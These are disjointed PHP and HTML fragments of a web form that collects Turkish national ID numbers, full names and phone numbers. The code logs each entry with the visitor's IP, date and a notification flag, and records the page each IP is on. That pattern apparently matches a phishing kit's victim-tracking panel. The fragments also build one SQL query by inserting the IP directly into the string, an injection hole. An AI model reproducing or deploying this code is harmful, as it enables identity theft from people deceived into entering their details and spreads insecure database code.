...
$db->query("UPDATE logs SET sayfa='Ana Sayfa' WHERE ip = '{$ip}'");
...
$query = $db->prepare("INSERT INTO logs SET
tckn = ?,
adsoyad = ?,
tel = ?,
ip = ?,
...
$insert = $query->execute(array(
     $tckn, $adsoyad, $tel, $ip, $tarih, $bildirim
));
if ($insert){
                                    ...
                                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                       ...
                                       <div class="form-group">
                                               <input type="text" name="tckn"
                                                 value="" maxlength="11" minlength="11" autocomplete="off" autocorrect="off"
                                                  autocapitalize="off" size="10" placeholder="T.C Kimlik Numarası"
                                                 class="form-control">
                                        </div>
                                        <div class="form-group">
                                               <input type="text" name="adsoyad"
                                                 value="" maxlength="63" autocomplete="off" autocorrect="off"
                                                  autocapitalize="off" size="10" placeholder="Ad Soyad"
                                                 class="form-control">
                                        </div>
                                        <div class="form-group">
                                               <input type="text" id="telefon" name="tel"
                                                 value="" maxlength="64" autocomplete="off" autocorrect="off"
                                                  autocapitalize="off" size="10" placeholder="Telefon Numarası"
                                                 class="form-control">
                                        </div>
